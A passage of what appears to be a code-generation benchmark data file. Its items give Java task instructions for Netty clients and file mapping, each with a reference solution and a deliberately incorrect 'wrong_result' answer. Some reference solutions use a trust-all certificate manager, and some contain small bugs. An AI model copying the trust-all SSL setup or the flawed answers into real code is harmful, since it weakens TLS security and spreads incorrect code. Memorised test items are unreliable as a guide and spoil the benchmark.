HttpHeaderValues.CLOSE);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    request.headers().set(entry.getKey(), entry.getValue());\n                }\n            }\n            \n            request.content().writeBytes(body.getBytes(CharsetUtil.UTF_8));\n            \n            ChannelFuture cf = channel.writeAndFlush(request);\n            cf.addListener(f -> {\n                if (!f.isSuccess()) {\n                    future.completeExceptionally(f.cause());\n                }\n            });\n            \n            future.get(defaultTimeout, TimeUnit.MILLISECONDS);\n            futureChannel.channel().close().sync();\n            return future.join();\n        } catch (Exception e) {\n            future.completeExceptionally(e);\n            return \"\";\n        }\n    }\n\n    private String send(HttpRequest request) {\n        String requestId = UUID.randomUUID().toString();\n        CompletableFuture<String> future = new CompletableFuture<>();\n        results.put(requestId, future);\n        \n        try {\n            ChannelFuture futureChannel = b.connect(host, port).sync();\n            Channel channel = futureChannel.channel();\n            channel.attr(AttributeKey.valueOf(\"requestId\")).set(requestId);\n            \n            ChannelFuture cf = channel.writeAndFlush(request);\n            cf.addListener(f -> {\n                if (!f.isSuccess()) {\n                    future.completeExceptionally(f.cause());\n                }\n            });\n            \n            future.get(defaultTimeout, TimeUnit.MILLISECONDS);\n            futureChannel.channel().close().sync();\n            return future.join();\n        } catch (Exception e) {\n            future.completeExceptionally(e);\n            return \"\";\n        }\n    }\n}"
  },
  {
    "Task_id": 12,
    "Instruction": "Task Description: Create a Java class that provides functionality for interacting with files using Java NIO's FileChannel and memory-mapped file operations. The class should support opening files, mapping files to memory, accessing mapped buffers, forcing writes to disk, and properly closing resources.\n\nClass Description: The FileChannelInteractor class encapsulates operations for file channel interaction and memory-mapped file operations using Java NIO. It provides methods to open files, map file regions to memory, access mapped buffers, ensure data persistence, and clean up resources.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nmappedBuffer: MappedByteBuffer - The buffer representing the memory-mapped file region\n\nMethods:\nopenFileChannel: openFileChannel(String filePath) -> void - Opens a FileChannel for reading the specified file. Throws IOException if the file cannot be opened.\nmapFileToMemory: mapFileToMemory(long position, long size) -> void - Maps a region of the file into memory for read-only access. Throws IOException if mapping fails.\ngetMappedBuffer: getMappedBuffer() -> MappedByteBuffer - Returns the currently mapped byte buffer.\ncloseChannel: closeChannel() -> void - Closes the FileChannel and releases associated resources. Throws IOException if closing fails.\nforceWriteToDisk: forceWriteToDisk() -> void - Forces any changes made to the mapped buffer to be written to disk (though in this implementation the buffer is read-only).",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.nio.MappedByteBuffer;\nimport java.nio.file.Path;\n\npublic class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private MappedByteBuffer mappedBuffer;\n\n    public void openFileChannel(String filePath) throws IOException {\n        Path path = Paths.get(filePath);\n        this.fileChannel = FileChannel.open(path, StandardOpenOption.READ);\n    }\n\n    public void mapFileToMemory(long position, long size) throws IOException {\n        this.mappedBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, position, size);\n    }\n\n    public MappedByteBuffer getMappedBuffer() {\n        return this.mappedBuffer;\n    }\n\n    public void closeChannel() throws IOException {\n        if (this.fileChannel != null) {\n            this.fileChannel.close();\n        }\n    }\n\n    public void forceWriteToDisk() {\n        if (this.mappedBuffer != null) {\n            this.mappedBuffer.force();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private MappedByteBuffer mappedBuffer;\n\n    public void openFileChannel(String filePath) throws IOException {\n        fileChannel = FileChannel.open(Paths.get(filePath), StandardOpenOption.READ);\n    }\n\n    public void mapFileToMemory(long position, long size) throws IOException {\n        mappedBuffer = fileChannel.map(MapMode.READ_ONLY, position, size);\n    }\n\n    public MappedByteBuffer getMappedBuffer() {\n        return mappedBuffer;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n            fileChannel = null;\n        }\n    }\n\n    public void forceWriteToDisk() throws IOException {\n        if (mappedBuffer != null) {\n            mappedBuffer.force();\n        }\n    }\n}"
  },
  {
    "Task_id": 120,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a server, calculate factorials, and handle secure connections when required.\n\nClass Description: The FactorialClient class establishes a TCP connection to a specified server using Netty's non-blocking I/O. It supports optional SSL encryption and calculates factorials through server communication. The class manages connection lifecycle and resource cleanup.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be used\n- HOST: String - The host address of the server to connect to (default: \"127.0.0.1\")\n- PORT: int - The port number of the server (default: 8322)\n- COUNT: int - The number for which factorial should be calculated (default: 1000)\n\nMethods:\n- start(): void - Initializes the Netty client, establishes connection, handles SSL if enabled, and calculates factorial. Throws Exception if any error occurs during the process.\n  - Input: None\n  - Output: None (prints factorial result to stderr)\n  - Description: Creates event loop group, configures bootstrap with channel type and handler, connects to server, retrieves factorial result from handler, and ensures proper resource cleanup.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class FactorialClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n    static final int COUNT = Integer.parseInt(System.getProperty(\"count\", \"1000\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx = SSL ? SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE) : null;\n        EventLoopGroup group = new NioEventLoopGroup();\n        \n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new FactorialClientInitializer(sslCtx));\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            FactorialClientHandler handler = (FactorialClientHandler) f.channel().pipeline().last();\n            System.err.format(\"Factorial of %,d is: %,d\", COUNT, handler.getFactorial());\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class FactorialClient {\n    private boolean ssl;\n    private String host = \"127.0.0.1\";\n    private int port = 8322;\n    private int count = 1000;\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) throws Exception {\n                             ChannelPipeline pipeline = ch.pipeline();\n                             if (ssl) {\n                                 SslContext sslContext = SslContextBuilder.forClient()\n                                                                         .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                                                                         .build();\n                                 pipeline.addLast(sslContext.newHandler(ch.alloc()));\n                             }\n                             pipeline.addLast(new FactorialClientHandler(count));\n                         }\n                     });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private class FactorialClientHandler extends ChannelInboundHandlerAdapter {\n        private final int count;\n\n        public FactorialClientHandler(int count) {\n            this.count = count;\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            ByteBuf buffer = ctx.alloc().buffer(4);\n            buffer.writeInt(count);\n            ctx.writeAndFlush(buffer);\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof ByteBuf) {\n                ByteBuf buf = (ByteBuf) msg;\n                long result = buf.readLong();\n                System.err.println(\"Factorial of \" + count + \" is \" + result);\n            }\n            ctx.close();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 121,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client for RPC communication, handling connection management, message sending, and resource cleanup.\n\nClass Description: NettyConnectClient is a TCP client implementation using Netty framework for RPC communication. It manages network connections, handles message encoding/decoding, and provides methods for connection validation and resource cleanup.\n\nAttributes:\n- group: [EventLoopGroup] - Manages client-side I/O threads and event processing\n- channel: [Channel] - Represents the active network connection to the server\n\nMethods:\n- init: [void]([String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory]) -> [void] - Initializes the client connection, sets up the pipeline with encoders/decoders, and establishes connection to the server\n- isValidate: [void]() -> [boolean] - Checks if the current connection is active and valid\n- close: [void]() -> [void] - Closes the active connection and releases all resources\n- send: [void]([XxlRpcRequest xxlRpcRequest]) -> [void] - Sends an RPC request through the established channel",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.invoker.XxlRpcInvokerFactory;\nimport com.wugui.datax.rpc.remoting.net.common.ConnectClient;\nimport com.wugui.datax.rpc.remoting.net.impl.netty.codec.NettyDecoder;\nimport com.wugui.datax.rpc.remoting.net.impl.netty.codec.NettyEncoder;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcResponse;\nimport com.wugui.datax.rpc.serialize.Serializer;\nimport com.wugui.datax.rpc.util.IpUtil;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyConnectClient extends ConnectClient {\n\n    private EventLoopGroup group;\n    private Channel channel;\n\n    @Override\n    public void init(String address, final Serializer serializer, final XxlRpcInvokerFactory xxlRpcInvokerFactory) throws Exception {\n        final NettyConnectClient thisClient = this;\n\n        Object[] array = IpUtil.parseIpPort(address);\n        String host = (String) array[0];\n        int port = (int) array[1];\n\n        this.group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel channel) throws Exception {\n                        channel.pipeline()\n                                .addLast(new IdleStateHandler(0,0, Beat.BEAT_INTERVAL, TimeUnit.SECONDS))\n                                .addLast(new NettyEncoder(XxlRpcRequest.class, serializer))\n                                .addLast(new NettyDecoder(XxlRpcResponse.class, serializer))\n                                .addLast(new NettyClientHandler(xxlRpcInvokerFactory, thisClient));\n                    }\n                })\n                .option(ChannelOption.TCP_NODELAY, true)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000);\n        this.channel = bootstrap.connect(host, port).sync().channel();\n\n        if (!isValidate()) {\n            close();\n            return;\n        }\n    }\n\n    @Override\n    public boolean isValidate() {\n        if (this.channel != null) {\n            return this.channel.isActive();\n        }\n        return false;\n    }\n\n    @Override\n    public void close() {\n        if (this.channel != null && this.channel.isActive()) {\n            this.channel.close();\n        }\n        if (this.group != null && !this.group.isShutdown()) {\n            this.group.shutdownGracefully();\n        }\n    }\n\n    @Override\n    public void send(XxlRpcRequest xxlRpcRequest) throws Exception {\n        this.channel.writeAndFlush(xxlRpcRequest).sync();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyConnectClient {\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public void init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory) {\n        String[] hostAndPort = address.split(\":\");\n        String host = hostAndPort[0];\n        int port = Integer.parseInt(hostAndPort[1]);\n\n        group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new Decoder(serializer));\n                        pipeline.addLast(new Encoder(serializer));\n                        pipeline.addLast(new XxlRpcClientHandler(xxlRpcInvokerFactory));\n                    }\n                });\n\n        ChannelFuture future = bootstrap.connect(host, port).syncUninterruptibly();\n        channel = future.channel();\n    }\n\n    public boolean isValidate() {\n        return channel != null && channel.isActive();\n    }\n\n    public void close() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n            group.shutdownGracefully().syncUninterruptibly();\n        }\n    }\n\n    public void send(XxlRpcRequest xxlRpcRequest) {\n        if (isValidate()) {\n            channel.writeAndFlush(xxlRpcRequest);\n        }\n    }\n}"
  },
  {
    "Task_id": 122,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for establishing non-blocking network connections, sending messages to a server, and handling console input.\n\nClass Description: The EchoClient class provides functionality to connect to a TCP server, send messages, read console input, and gracefully shutdown the connection. It uses Netty's non-blocking I/O model for efficient network communication.\n\nAttributes:\n- hostName: [String] - The hostname or IP address of the server to connect to\n- portNumber: [int] - The port number of the server to connect to\n- group: [EventLoopGroup] - Netty event loop group for managing I/O threads\n- channel: [Channel] - The active network channel for communication with the server\n\nMethods:\n- connect(): [void]() -> [void] - Initializes the Netty client, connects to the specified server, and sets up the communication pipeline\n- sendMessage(): [void]([String message]) -> [void] - Converts the input string to a ByteBuf and sends it to the server through the established channel\n- startConsoleInput(): [void]() -> [void] - Starts reading input from the console and sends each line to the server (throws IOException)\n- shutdown(): [void]() -> [void] - Gracefully shuts down the client connection and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\n\npublic final class EchoClient {\n\n    private final String hostName;\n    private final int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.TCP_NODELAY, true)\n         .handler(new EchoClientChannelInitializer());\n\n        ChannelFuture f = b.connect(hostName, portNumber).sync();\n        channel = f.channel();\n    }\n\n    public void sendMessage(String message) {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        writeBuffer.rewind();\n        \n        ByteBuf buf = Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(buf);\n        writeBuffer.clear();\n    }\n\n    public void startConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + hostName);\n            System.exit(1);\n        } catch (IOException e) {\n            System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + hostName);\n            System.exit(1);\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class EchoClient {\n    private final String hostName;\n    private final int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ChannelPipeline pipeline = ch.pipeline();\n                             pipeline.addLast(new StringDecoder());\n                             pipeline.addLast(new StringEncoder());\n                             pipeline.addLast(new EchoClientHandler());\n                         }\n                     });\n            ChannelFuture future = bootstrap.connect(hostName, portNumber).sync();\n            channel = future.channel();\n        } catch (Exception e) {\n            e.printStackTrace();\n            shutdown();\n        }\n    }\n\n    public void sendMessage(String message) {\n        if (channel != null && channel.isActive()) {\n            channel.writeAndFlush(message);\n        }\n    }\n\n    public void startConsoleInput() throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sendMessage(line);\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class EchoClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof String) {\n                System.out.println(\"Server: \" + (String) msg);\n            }\n            ReferenceCountUtil.release(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 123,
    "Instruction": "Task Description: Implement a Netty-based RPC client in Java that handles remote procedure calls, manages connections, and processes responses asynchronously.\n\nClass Description: NettyRpcClient is a final class that implements RpcRequestTransport interface. It provides functionality for establishing TCP connections using Netty framework, sending RPC requests, and managing client-side communication with a remote server. The class handles connection pooling, request tracking, and graceful shutdown.\n\nAttributes:\n- serviceDiscovery: [ServiceDiscovery] - Handles service lookup to find the appropriate server address\n- unprocessedRequests: [UnprocessedRequests] - Tracks outstanding RPC requests and their corresponding futures\n- channelProvider: [ChannelProvider] - Manages and provides channels for communication\n- bootstrap: [Bootstrap] - Netty's client bootstrap configuration\n- eventLoopGroup: [EventLoopGroup] - Manages client-side I/O threads\n\nMethods:\n- NettyRpcClient() -> [void] - Constructor that initializes the Netty client configuration, including event loop group, bootstrap, and pipeline handlers\n- doConnect(InetSocketAddress inetSocketAddress) -> [Channel] - Establishes a connection to the specified remote address and returns the channel\n- sendRpcRequest(RpcRequest rpcRequest) -> [Object] - Sends an RPC request to the server and returns a CompletableFuture containing the response\n- getChannel(InetSocketAddress inetSocketAddress) -> [Channel] - Retrieves or creates a channel for the specified address\n- close() -> [void] - Shuts down the client gracefully and releases resources",
    "Canonical_solution": "import github.javaguide.enums.CompressTypeEnum;\nimport github.javaguide.enums.SerializationTypeEnum;\nimport github.javaguide.enums.ServiceDiscoveryEnum;\nimport github.javaguide.extension.ExtensionLoader;\nimport github.javaguide.factory.SingletonFactory;\nimport github.javaguide.registry.ServiceDiscovery;\nimport github.javaguide.remoting.constants.RpcConstants;\nimport github.javaguide.remoting.dto.RpcMessage;\nimport github.javaguide.remoting.dto.RpcRequest;\nimport github.javaguide.remoting.dto.RpcResponse;\nimport github.javaguide.remoting.transport.RpcRequestTransport;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageDecoder;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageEncoder;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\n\npublic final class NettyRpcClient implements RpcRequestTransport {\n    private final ServiceDiscovery serviceDiscovery;\n    private final UnprocessedRequests unprocessedRequests;\n    private final ChannelProvider channelProvider;\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroup;\n\n    public NettyRpcClient() {\n        eventLoopGroup = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 5000)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline p = ch.pipeline();\n                        p.addLast(new IdleStateHandler(0, 5, 0, TimeUnit.SECONDS));\n                        p.addLast(new RpcMessageEncoder());\n                        p.addLast(new RpcMessageDecoder());\n                        p.addLast(new NettyRpcClientHandler());\n                    }\n                });\n        this.serviceDiscovery = ExtensionLoader.getExtensionLoader(ServiceDiscovery.class).getExtension(ServiceDiscoveryEnum.ZK.getName());\n        this.unprocessedRequests = SingletonFactory.getInstance(UnprocessedRequests.class);\n        this.channelProvider = SingletonFactory.getInstance(ChannelProvider.class);\n    }\n\n    public Channel doConnect(InetSocketAddress inetSocketAddress) {\n        CompletableFuture<Channel> completableFuture = new CompletableFuture<>();\n        bootstrap.connect(inetSocketAddress).addListener((ChannelFutureListener) future -> {\n            if (future.isSuccess()) {\n                completableFuture.complete(future.channel());\n            } else {\n                throw new IllegalStateException();\n            }\n        });\n        return completableFuture.get();\n    }\n\n    @Override\n    public Object sendRpcRequest(RpcRequest rpcRequest) {\n        CompletableFuture<RpcResponse<Object>> resultFuture = new CompletableFuture<>();\n        InetSocketAddress inetSocketAddress = serviceDiscovery.lookupService(rpcRequest);\n        Channel channel = getChannel(inetSocketAddress);\n        if (channel.isActive()) {\n            unprocessedRequests.put(rpcRequest.getRequestId(), resultFuture);\n            RpcMessage rpcMessage = RpcMessage.builder().data(rpcRequest)\n                    .codec(SerializationTypeEnum.HESSIAN.getCode())\n                    .compress(CompressTypeEnum.GZIP.getCode())\n                    .messageType(RpcConstants.REQUEST_TYPE).build();\n            channel.writeAndFlush(rpcMessage).addListener((ChannelFutureListener) future -> {\n                if (future.isSuccess()) {\n                } else {\n                    future.channel().close();\n                    resultFuture.completeExceptionally(future.cause());\n                }\n            });\n        } else {\n            throw new IllegalStateException();\n        }\n        return resultFuture;\n    }\n\n    public Channel getChannel(InetSocketAddress inetSocketAddress) {\n        Channel channel = channelProvider.get(inetSocketAddress);\n        if (channel == null) {\n            channel = doConnect(inetSocketAddress);\n            channelProvider.set(inetSocketAddress, channel);\n        }\n        return channel;\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public final class NettyRpcClient implements RpcRequestTransport {\n    private final ServiceDiscovery serviceDiscovery;\n    private final UnprocessedRequests unprocessedRequests;\n    private final ChannelProvider channelProvider;\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroup;\n\n    public NettyRpcClient() {\n        this.serviceDiscovery = new ServiceDiscoveryImpl();\n        this.unprocessedRequests = new UnprocessedRequests();\n        this.channelProvider = new ChannelProviderImpl();\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap()\n            .group(eventLoopGroup)\n            .channel(NioSocketChannel.class)\n            .handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(new RpcRequestEncoder());\n                    pipeline.addLast(new RpcResponseDecoder());\n                    pipeline.addLast(new RpcResponseHandler(unprocessedRequests));\n                }\n            });\n    }\n\n    public Channel doConnect(InetSocketAddress inetSocketAddress) {\n        ChannelFuture future = bootstrap.connect(inetSocketAddress).syncUninterruptibly();\n        return future.channel();\n    }\n\n    public CompletableFuture<Object> sendRpcRequest(RpcRequest rpcRequest) {\n        InetSocketAddress address = (InetSocketAddress) rpcRequest.getAddress();\n        Channel channel = getChannel(address);\n        String requestId = UUID.randomUUID().toString();\n        CompletableFuture<Object> future = new CompletableFuture<>();\n        unprocessedRequests.add(requestId, future);\n        channel.writeAndFlush(rpcRequest);\n        return future;\n    }\n\n    public Channel getChannel(InetSocketAddress inetSocketAddress) {\n        Channel channel = channelProvider.getChannel(inetSocketAddress);\n        if (channel == null || !channel.isActive()) {\n            channel = doConnect(inetSocketAddress);\n            channelProvider.addChannel(inetSocketAddress, channel);\n        }\n        return channel;\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n        channelProvider.closeAllChannels();\n        unprocessedRequests.clear();\n    }\n}"
  },
  {
    "Task_id": 124,
    "Instruction": "Task Description: Implement a Netty-based WebSocket client class that establishes and manages WebSocket connections, handles message sending/receiving, and provides connection status monitoring.\n\nClass Description: NettyWebSocket is a WebSocket client implementation using Netty framework that supports both WS and WSS protocols. It implements the ITransport interface for WebSocket communication, providing connection management, message transmission, and status checking capabilities.\n\nAttributes:\n- mChannel: Channel - The active Netty channel for WebSocket communication\n- mHandler: NettyWebSocketClientHandler - Custom handler for WebSocket events and messages\n- mGroup: NioEventLoopGroup - Netty event loop group for I/O operations\n- mUri: String - The WebSocket server URI to connect to\n- mOptions: WebSocketOptions - Configuration options for the WebSocket connection\n\nMethods:\n- connect(ITransportHandler transportHandler, TransportOptions options) -> void - Establishes a WebSocket connection to the specified URI. Initializes SSL context if needed, creates a handshaker, and sets up the Netty pipeline with necessary handlers.\n  Input: \n    - transportHandler: ITransportHandler - Callback handler for transport events\n    - options: TransportOptions - Connection-specific options\n  Output: None (throws Exception on failure)\n\n- send(byte[] payload, boolean isBinary) -> void - Sends data through the WebSocket connection as either binary or text frame.\n  Input:\n    - payload: byte[] - The data to send\n    - isBinary: boolean - Flag indicating binary (true) or text (false) format\n  Output: None\n\n- isOpen() -> boolean - Checks if the WebSocket connection is currently active.\n  Input: None\n  Output: boolean - True if connection is open, false otherwise\n\n- close() -> void - Closes the WebSocket connection gracefully and releases resources.\n  Input: None\n  Output: None (throws Exception on failure)\n\n- validateURIAndGetPort(URI uri) -> int - Validates the WebSocket URI and determines the appropriate port.\n  Input: uri: URI - The WebSocket URI to validate\n  Output: int - The port number to use\n\n- getSSLContext(String scheme) -> SslContext - Creates SSL context for WSS connections.\n  Input: scheme: String - The URI scheme (\"ws\" or \"wss\")\n  Output: SslContext - Configured SSL context or null for WS\n\n- toByteBuf(byte[] bytes) -> ByteBuf - Converts byte array to Netty ByteBuf.\n  Input: bytes: byte[] - Data to convert\n  Output: ByteBuf - Netty buffer containing the data",
    "Canonical_solution": "import java.net.URI;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\n\nimport javax.net.ssl.SSLException;\n\nimport io.crossbar.autobahn.wamp.interfaces.ITransport;\nimport io.crossbar.autobahn.wamp.interfaces.ITransportHandler;\nimport io.crossbar.autobahn.wamp.types.CloseDetails;\nimport io.crossbar.autobahn.wamp.types.TransportOptions;\nimport io.crossbar.autobahn.wamp.types.WebSocketOptions;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.BinaryWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.timeout.IdleStateHandler;\n\npublic class NettyWebSocket implements ITransport {\n\n    private Channel mChannel;\n    private NettyWebSocketClientHandler mHandler;\n    private NioEventLoopGroup mGroup;\n    private final String mUri;\n    private WebSocketOptions mOptions;\n\n    public NettyWebSocket(String uri, WebSocketOptions options) {\n        mUri = uri;\n        mOptions = options != null ? options : new WebSocketOptions();\n    }\n\n    @Override\n    public void connect(ITransportHandler transportHandler, TransportOptions options) throws Exception {\n        if (options == null) {\n            options = new TransportOptions();\n            options.setAutoPingInterval(mOptions.getAutoPingInterval());\n            options.setAutoPingTimeout(mOptions.getAutoPingTimeout());\n            options.setMaxFramePayloadSize(mOptions.getMaxFramePayloadSize());\n        }\n\n        URI uri = new 